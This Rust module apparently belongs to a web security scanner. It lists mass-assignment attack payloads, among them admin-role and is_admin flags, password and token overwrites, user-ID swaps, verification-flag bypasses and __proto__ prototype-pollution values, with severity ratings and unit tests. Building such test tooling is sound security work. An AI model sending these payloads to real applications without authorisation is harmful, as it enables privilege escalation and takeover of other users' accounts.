use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = payload_vec!(PayloadType::MassAssign,
        "admin-privileges", [
            ("role=admin", "Admin role assignment", Severity::Critical),
            ("is_admin=true", "is_admin flag set", Severity::Critical),
            ("isAdmin=1", "isAdmin flag set", Severity::Critical),
            ("admin=true", "admin flag set", Severity::Critical),
            ("privileges=admin", "privileges admin assignment", Severity::Critical),
            ("authority=ROLE_ADMIN", "ROLE_ADMIN assignment", Severity::Critical),
            ("user_type=administrator", "administrator type assignment", Severity::Critical),
            ("isSuperUser=true", "Superuser flag", Severity::Critical),
            ("is_root=1", "Root flag set", Severity::Critical),
            ("access_level=99", "High access level", Severity::Critical),
        ];
        "sensitive-fields", [
            ("password=admin123", "Password assignment", Severity::Critical),
            ("password_hash=...", "Password hash assignment", Severity::Critical),
            ("credit_card=4111111111111111", "Credit card assignment", Severity::Critical),
            ("ssn=123-45-6789", "SSN assignment", Severity::Critical),
            ("api_key=secret_key", "API key assignment", Severity::Critical),
            ("secret=...", "Secret assignment", Severity::Critical),
            ("token=...", "Token assignment", Severity::Critical),
            ("private_key=...", "Private key assignment", Severity::Critical),
        ];
        "id-manipulation", [
            ("id=1", "ID manipulation to 1", Severity::High),
            ("id=0", "ID manipulation to 0", Severity::High),
            ("id=-1", "ID manipulation to -1", Severity::High),
            ("user_id=999999", "Large user ID", Severity::High),
            ("id={{other_user_id}}", "Other user ID assignment", Severity::Critical),
            ("_id={{object_id}}", "MongoDB _id assignment", Severity::Critical),
            ("uid={{user_id}}", "UID assignment", Severity::Critical),
        ];
        "status-fields", [
            ("verified=true", "Verified flag set", Severity::High),
            ("verified=1", "Verified flag numeric", Severity::High),
            ("active=true", "Active flag set", Severity::High),
            ("status=active", "Status active assignment", Severity::High),
            ("locked=false", "Locked false assignment", Severity::High),
            ("enabled=true", "Enabled flag set", Severity::High),
            ("email_verified=true", "Email verified set", Severity::High),
            ("phone_verified=true", "Phone verified set", Severity::Medium),
        ];
        "bypass-wildcard", [
            ("*=*", "Wildcard assignment", Severity::Critical),
            ("__proto__=*", "Prototype pollution attempt", Severity::Critical),
            ("constructor=*", "Constructor assignment", Severity::Critical),
            ("[{\"role\":\"admin\"}]", "Array role assignment", Severity::Critical),
            ("role[]=admin", "Array role assignment alt", Severity::Critical),
        ];
        "nested-objects", [
            ("user[role]=admin", "Nested role assignment", Severity::Critical),
            ("user[is_admin]=true", "Nested admin flag", Severity::Critical),
            ("user[permissions][]=delete", "Nested permissions append", Severity::High),
            ("data[settings][isVisible]=false", "Nested settings bypass", Severity::High),
            ("profile[admin]=true", "Nested profile admin", Severity::Critical),
            ("metadata[role]=admin", "Nested metadata role", Severity::Critical),
        ];
    );

    for p in &mut payloads {
        if !p.tags.contains(&"mass-assignment".to_string()) {
            p.tags.push("mass-assignment".to_string());
        }
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "Mass assignment payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_massassign_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::MassAssign);
        }
    }

    #[test]
    fn contains_admin_privilege_bypass() {
        let payloads = get_payloads();
        let has_admin = payloads.iter().any(|p| {
            p.payload.contains("admin") || p.payload.contains("Admin") || p.payload.contains("ROLE")
        });
        assert!(has_admin, "Must contain admin privilege bypass payloads");
    }

    #[test]
    fn contains_sensitive_field_assignment() {
        let payloads = get_payloads();
        let has_sensitive = payloads.iter().any(|p| {
            p.payload.contains("password") || p.payload.contains("secret") || p.payload.contains("token")
        });
        assert!(has_sensitive, "Must contain sensitive field assignment payloads");
    }

    #[test]
    fn contains_id_manipulation() {
        let payloads = get_payloads();
        let has_id = payloads.iter().any(|p| {
            p.payload.contains("id=") || p.payload.contains("_id") || p.payload.contains("uid")
        });
        assert!(has_id, "Must contain ID manipulation payloads");
    }

    #[test]
    fn contains_nested_objects() {
        let payloads = get_payloads();
        let has_nested = payloads.iter().any(|p| {
            p.payload.contains("[") && p.payload.contains("]=")
        });
        assert!(has_nested, "Must contain nested object assignment payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 25,
            "Must have substantial mass assignment coverage, got {}",
            payloads.len()
        );
    }
}
